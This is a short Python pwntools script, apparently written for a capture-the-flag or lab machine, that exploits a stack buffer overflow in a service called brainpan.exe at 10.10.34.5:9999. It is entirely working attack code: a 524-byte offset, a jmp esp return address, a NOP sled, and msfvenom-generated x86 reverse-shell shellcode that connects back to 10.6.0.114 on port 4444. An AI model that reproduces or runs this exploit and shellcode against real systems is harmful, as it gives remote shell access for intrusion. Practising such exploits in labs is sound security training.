#!/bin/python3

from pwn import *

context.log_level = 'debug'

r = remote('10.10.34.5', 9999)

offset = 524
payload = b'A'*offset
payload += p32(0x311712f3) # found with `ROPgadget --binary brainpan.exe  | grep 'jmp esp'`
payload += b'\x90'*32

# found with `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.6.0.114 LPORT=4444 -f python -b='\x00'`

buf =  b""
buf += b"\xba\x4b\xb7\x40\xb7\xdb\xcd\xd9\x74\x24\xf4\x5f"
buf += b"\x33\xc9\xb1\x12\x31\x57\x12\x83\xef\xfc\x03\x1c"
buf += b"\xb9\xa2\x42\x93\x1e\xd5\x4e\x80\xe3\x49\xfb\x24"
buf += b"\x6d\x8c\x4b\x4e\xa0\xcf\x3f\xd7\x8a\xef\xf2\x67"
buf += b"\xa3\x76\xf4\x0f\x3e\x8f\x06\xbd\x56\x8d\x06\x50"
buf += b"\xfb\x18\xe7\xe2\x65\x4b\xb9\x51\xd9\x68\xb0\xb4"
buf += b"\xd0\xef\x90\x5e\x85\xc0\x67\xf6\x31\x30\xa7\x64"
buf += b"\xab\xc7\x54\x3a\x78\x51\x7b\x0a\x75\xac\xfc"



payload += buf

r.sendline(payload)

r.interactive()


